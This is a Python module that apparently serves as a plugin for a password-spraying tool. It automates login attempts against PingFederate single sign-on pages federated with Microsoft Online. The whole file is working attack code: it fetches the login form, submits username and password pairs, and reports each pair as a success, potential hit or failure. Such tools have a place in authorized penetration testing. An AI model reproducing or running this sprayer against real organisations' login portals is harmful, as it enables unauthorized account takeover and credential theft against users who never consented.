import requests
import utils.utils as utils
from bs4 import BeautifulSoup


def pingfed_authenticate(api, username, password, useragent, pluginargs):

    data_response = {
        'result' : None,    # Can be "success", "failure" or "potential"
        'error' : False,
        'output' : "",
        'valid_user' : False
    }

    post_data = {
        'pf.username' : username,
        'pf.pass' : password,
        'pf.ok' : 'clicked',
        'pf.cancel' : '',
        'pf.adapterId' : 'PingOneHTMLFormAdapter'
    }

    # ?client-request-id=&wa=wsignin1.0&wtrealm=urn:federation:MicrosoftOnline&wctx=cbcxt=&username={}&mkt=&lc=
    params_data =  {
        'client-request-id' : '',
        'wa' : 'wsignin1.0',
        'wtrealm' : 'urn:federation:MicrosoftOnline',
        'wctx' : '',
        'cbcxt' : '',
        'username' : username,
        'mkt' : '',
        'lc' : '',
        'pullStatus' : 0
    }

    headers = {
        'User-Agent' : useragent,
        'Content-Type' : 'application/x-www-form-urlencoded',
        'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9, image/webp,*/*;q=0.8'
    }

    headers = utils.add_custom_headers(pluginargs, headers)

    try: 
        # Get cookie and form action URL. Update with each request to avoid "page expired" responses.
        sess = requests.session()
        resp = api.get("/idp/prp.wsf", headers=headers, params=params_data, session=sess)
        page = BeautifulSoup(resp.text, features="html.parser")
        action = page.find('form').get('action')

        # Auth attempt
        resp = api.post(str(action), headers=headers, params=params_data, data=post_data, allow_redirects=False, session=sess) 
        page = BeautifulSoup(resp.text, features="html.parser")

        if "idp_account_id" in resp.text:
            data_response['result'] = "success"
            data_response['output'] = f"[+] SUCCESS: => {username}:{password}"
            data_response['valid_user'] = True

        # Check if page has password field
        elif "pf.pass" not in resp.text:
            data_response['result'] = "potential"
            data_response['output'] = f"[?] UNKNOWN: {resp.status_code} => {username}:{password}"

        else:  # fail
            data_response['result'] = "failure"
            data_response['output'] = f"[-] FAILURE: {resp.status_code} => {username}:{password}"

        # Append "ping-messages" section from response for debugging
        try: 
            message = page.find("div", {"class":"ping-messages"}).text.strip()
            data_response['output'] += f" Message: {message}"
        except Exception as ex:
            pass

    except Exception as ex:
        data_response['error'] = True
        data_response['output'] = ex
        pass

    return data_response
